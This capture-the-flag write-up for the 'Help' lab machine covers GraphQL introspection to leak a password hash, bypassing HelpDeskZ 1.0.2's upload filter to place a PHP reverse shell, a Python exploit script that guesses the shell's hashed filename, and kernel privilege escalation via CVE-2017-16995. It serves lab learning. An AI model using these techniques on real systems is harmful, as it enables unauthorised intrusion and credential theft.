# 20251230-Help - CTF Writeup

**Status:** Completed
**Date Started:** 2025-12-30  

---

## Reconnaissance

### Nmap Scan
```bash
nmap -sC -sV -A -p- help.htb
```

**Open Ports:**
- Port 22/tcp - OpenSSH 7.2p2
- Port 80/tcp - Apache httpd 2.4.18
    - Redirects to `help.htb`
- Port 3000/tcp - Node.js Express Framework

### HTTP Enumeration
- **Web Server:** 
    - Apache httpd 2.4.18 (port 80); and 
    - Node.js Express Framework on Port 3000
- **Technologies:** Node.js Express Framework
- **Interesting Directories:** 
    - `/support/` on Port 80

### Other Services
Tried lots of things other than massive `gobuster dir` runs. A sneak peak at the hints in the guided method of HTB indicated that the directory is uncommon. It turns out that `/graphql` is the spot to look. After digging into the documentation at some sample queries, I was able to find the schema for the data set. After getting the schema, it took various tests to determine the user list, but after some trial and error, I got to something useful. 

### Trial and Error Notes Below
#### User Manual Query info
```json
query {
  __schema {
    types {
      name
    }
  }
}
```

#### This worked via GET in Burp:
`GET /graphql?query={__schema{types{name}}} HTTP/1.1`

Output:
```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json
Content-Length: 283
Date: Thu, 01 Jan 2026 19:00:50 GMT
Connection: keep-alive

{"data":{"__schema":{"types":[{"name":"Query"},{"name":"User"},{"name":"String"},{"name":"__Schema"},{"name":"__Type"},{"name":"__TypeKind"},{"name":"Boolean"},{"name":"__Field"},{"name":"__InputValue"},{"name":"__EnumValue"},{"name":"__Directive"},{"name":"__DirectiveLocation"}]}}}
```

#### From User Manual:
```
Types preceded with a double underscore that are part of the introspection system: __Schema, __Type, __TypeKind, __Field, __InputValue, __EnumValue, __Directive, and __DirectiveLocation
```
#### New Test:
- GET /graphql?query={__type(name: "User"){fields{name}} HTTP/1.1
  - Nope
- GET /graphql?query={user{username}} HTTP/1.1
  - Info!

```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json
Content-Length: 50
Date: Sat, 03 Jan 2026 03:42:32 GMT
Connection: keep-alive

{"data":{"user":{"username":"helpme@helpme.com"}}}
```

---

## Vulnerabilities Identified

### Vulnerability #1: GraphQL
- **Type:** GraphQL credential exposure
- **Description:** Using BurpSuite, we were able to submit GET requests to get a username and password (hashed). 
- **Impact:** I can now use hashcat to crack the hash and then log in to either the support interface
- **Exploitation:** Burping. 

```http
GET /graphql?query={user{password}} HTTP/1.1
Host: help.htb:3000
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=77k5q7tvfghirmvnj922o90sf0
If-None-Match: W/"51-gr8XZ5dnsfHNaB2KgX/Gxm9yVZU"
Connection: keep-alive
```
 Cracked the password hash using hashcat. Applied the username email and password to `http://help.htb/support`. 

---

## Exploitation
Was able to login to machine using cracked user/pass. Can submit tickets. Found two possible routes to exploitation for HelpDeskZ v1.0.2. 

The first involves submitting a ticket with a PHP reverse shell file. This was an interesting method to explore. You can submit a PHP file, but it tells you that usch files are not allowed. Some internet guides for Help indicate that it still uploads, but that felt like a guess. Using Burp's intersceptor, I was able to submit the ticket with attachment and catch the submission, modify the content type to "image/jpeg" and then have it go through successfully. 

That was great and all, but we still need to be able to execute it. So, the question becomes, where the heck do the uploads hide and what are they named. In poking arounda copy of the HelpDeskZ v1.0.2 git, we can determine that the likely location of the uploads is `help.htb/support/tickets/uploads`. We also note from our searchsploit script that the filenames are coded based on upload time and hashed using md5. The searchsploit script used to hunt the filename down was a bit clunky. I rewrote it for python3 as shown below. Once the file was submitted with the ticket, I spun up a netcat instance for port 1234 and ran my script. This got me my shell and I quickly snagged the user flag. 

```python
'''
# HelpDeskZ Exploit: Unauthenticated Shell Upload

## Original Exploit
- Date: 2016-08-26
- Author: Lars Morgenroth - @krankoPwnz
- Software: HelpDeskZ - Version 1.0.2

## Updated Exploit Script
- Date: 2026-01-08
- Update Justification:
    Original used Python2 and included some syntax issues. 
    Script implementation was not clear.

## Implementation


'''
import sys
import time
import requests
import hashlib
from datetime import datetime,timezone

hostname = 'help.htb/support/uploads/tickets' # hostname or IP
filename = 'shellathon.php' # Uploaded filename

def getServerTime(hostname=hostname):
    # Define URL
    baseUrl = 'http://' + hostname + '/'
    
    # File request and get date/time
    r = requests.get(baseUrl)
    curDateTimeStr = r.headers['date']
    curDateTime = datetime.strptime(curDateTimeStr, 
                                    '%a, %d %b %Y %H:%M:%S %Z')
    # Set timezone to GMT/UTC
    curDateTime = curDateTime.replace(tzinfo=timezone.utc) 

    # PHP .time function returns the current time measured in 
    # seconds since the Unix Epoch (Jan 1 1970 00:00:00 GMT)
    epochTime = curDateTime - datetime(1970,1,1,tzinfo=timezone.utc)
    epochTimeSecs = int(epochTime.total_seconds())
    return epochTimeSecs

def fileHunter(curDateTime, timeIncrement):
    # Define file to test for based on selected time increment
    timeOffset = curDateTime - timeIncrement
    testName = filename + str(timeOffset)
    fhash = hashlib.md5(testName.encode('utf-8')).hexdigest()

    # Define URL and query server
    queryUrl = 'http://' + hostname + '/' + fhash + '.php' 
    r = requests.head(queryUrl)

    if r.status_code == 200:
        print("Found it!")
        print(queryUrl)
        sys.exit(0)

    return None

if __name__ == "__main__":
    cdt = getServerTime()
    for i in range(0,300):
        fileHunter(cdt,i)
    print('Found nada. :(')
```
---

## Privilege Escalation
**Linux Kernel:** kernel 4.4.0-116-generic 
**Vulnerability Found:** CVE-2017-16995
I downloaded a copy of the C script that exploits this known CVE (https://www.exploit-db.com/exploits/45010), started a web server in my local working directory and moved the script to the target machine using `wget`. Once there, I ran gcc on the file, using the `-o outfile` flag to create an executable named "outfile". Then I made sure it was executable and ran it. It appeared to do nothing, but with no prompt present, I typed `whoami` and it came back with root. I grabbed the flag. 

